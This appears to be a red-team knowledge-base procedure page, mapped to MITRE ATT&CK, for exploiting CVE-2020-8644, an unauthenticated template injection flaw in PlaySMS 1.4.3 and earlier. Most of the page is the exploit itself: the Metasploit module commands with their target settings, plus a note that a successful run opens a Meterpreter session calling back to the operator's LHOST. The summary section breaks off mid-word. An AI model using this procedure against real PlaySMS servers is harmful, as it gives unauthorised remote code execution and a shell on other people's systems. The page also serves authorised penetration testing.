---
id: 91473e99-d37d-4b2e-880e-2a6618c63e66
name: PlaySMS <= 1.4.3 Template Injection RCE via Metasploit (Unauthenticated)
type: procedure
verified: true
submitted: true
created_at: '2020-04-17T02:20:12.613370+00:00'
updated_at: '2023-05-26T00:52:48.665837+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
platforms:
- Web
tags:
- '[[exploit]]'
- '[[injection]]'
- '[[Web Applications]]'
commands:
- '[[Exploit PlaySMS Template Injection Vulnerability (Metasploit)]]'
---

# PlaySMS <= 1.4.3 Template Injection RCE via Metasploit (Unauthenticated)

**Status**: ✓ Verified

## Summary

PlaySMS versions 1.4.3 and earlier are vulnerable to an unauthneticated template injection attack which results in code execution (CVE-2020-8644). This vulnerability is due to improper input validation, and seems to exist on all versions of PlaySMS. When a malicious username is submitted, the paylo

## Description

# Description

PlaySMS versions 1.4.3 and earlier are vulnerable to an unauthneticated template injection attack which results in code execution (CVE-2020-8644). This vulnerability is due to improper input validation, and seems to exist on all versions of PlaySMS. When a malicious username is submitted, the payload is stored in a TPL template, which is then executed when rendered a second time.

# Instructions

From a Metasploit session, set and configure the PlaySMS Template Injection module, then run it.

**Command** ([[Exploit PlaySMS Template Injection Vulnerability (Metasploit)]]):

```bash
use exploit/multi/http/playsms_template_injection
set RHOSTS $_TARGET_IP
set RPORT $_TARGET_PORT
set TARGETURI $_BASE_URI
run
```

Note: This procedure uses Meterpreter shell with default settings. If the exploit fails to create a Meterpreter session, verify the LHOST value is correct and if not, set it manually.

## Platforms

- Web

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Commands Used

- [[Exploit PlaySMS Template Injection Vulnerability (Metasploit)]]

## Tags

- [[exploit]]
- [[injection]]
- [[Web Applications]]
